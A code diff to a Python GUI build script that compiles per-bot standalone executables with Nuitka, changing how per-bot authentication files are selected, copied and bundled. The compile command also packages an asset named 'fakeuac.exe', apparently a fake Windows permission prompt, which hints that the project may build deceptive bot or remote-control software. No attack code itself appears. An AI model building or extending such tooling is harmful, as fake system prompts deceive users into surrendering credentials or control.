@@ -7,11 +7,11 @@ import multiprocessing as mp
 from multiprocessing.queues import Queue
 from queue import Empty
 from time import perf_counter
-from shutil import rmtree
+from shutil import rmtree, copytree
 from threading import Thread
 from subprocess import Popen, PIPE, STDOUT
 from os import chdir, listdir, remove
-from os.path import isdir, join, abspath, isfile
+from os.path import isdir, join, abspath, isfile, split as pathsplit
 
 import customtkinter as ctk
 from tkinter.messagebox import askyesno
@@ -32,6 +32,7 @@ PYTHON_PATH = join(VENV_PATH, "Scripts", "python.exe")
 REQUIREMENTS_COMMAND = f"{PIP_PATH} install -r requirements.txt"
 
 PY_FILE_MARKER = "PY_FILE_MARKER"
+AUTH_FILE_MARKER = "AUTH_FILE_MARKER"
 COMPILE_COMMAND = (
     f"{PYTHON_PATH} -m nuitka {PY_FILE_MARKER} "
     "--standalone "
@@ -42,7 +43,7 @@ COMPILE_COMMAND = (
     "--include-data-dir=assets/vfx=assets/vfx "
     "--include-data-dir=assets/sfx=assets/sfx "
     "--include-data-dir=assets/model=assets/model "
-    "--include-data-file=auth.json=auth.json "
+    f"--include-data-file={AUTH_FILE_MARKER}=auth.json "
     "--include-data-file=assets/executables/fakeuac.exe=assets/executables/fakeuac.exe"
 )
 
@@ -65,6 +66,14 @@ with open(PY_FILE_PATH, "r", encoding="utf-8") as fi:
 def copy_file(src: str, dst: str) -> None:
     with open(src, "r", encoding="utf-8") as fi, open(dst, "w", encoding="utf-8") as fo:
         fo.write(fi.read())
+
+def clone_directory(source_dir, destination_dir):
+    """
+    Clone the source directory into the destination directory.
+    Overwrites existing files and directories.
+    """
+    os.makedirs(destination_dir, exist_ok=True)
+    copytree(source_dir, destination_dir, dirs_exist_ok=True)
 
 
 # ---------------------------------------------------------------------------
@@ -148,11 +157,14 @@ def compile_worker(
         # ------------------------------------------------------------------
 
         compile_cmd = COMPILE_COMMAND.replace(PY_FILE_MARKER, source_name)
+        compile_cmd = compile_cmd.replace(AUTH_FILE_MARKER, join(pathsplit(AUTHS_DIRNAME)[-1], pathsplit(auth_path)[-1]))
+        print(f"Running: {compile_cmd}")
         rc, output = run_and_capture(compile_cmd)
         
         cache_dirs = (
             join(REPO_NAME, f"{bot_username}.build"),
             join(REPO_NAME, f"{bot_username}.dist"),
+            join(REPO_NAME, f"{bot_username}.onefile-build"),
         )
         cache_file = source_name
         try:
@@ -340,7 +352,7 @@ class GUI:
             f"Do you want to use the authentication files found in {AUTHS_DIRNAME}?",
         ):
             return None
-
+        clone_directory(AUTHS_DIRNAME, join(REPO_NAME, pathsplit(AUTHS_DIRNAME)[-1]))
         return ToggleWindow(listdir(AUTHS_DIRNAME)).get_toggle_values()
 
     def _build_widgets(self):
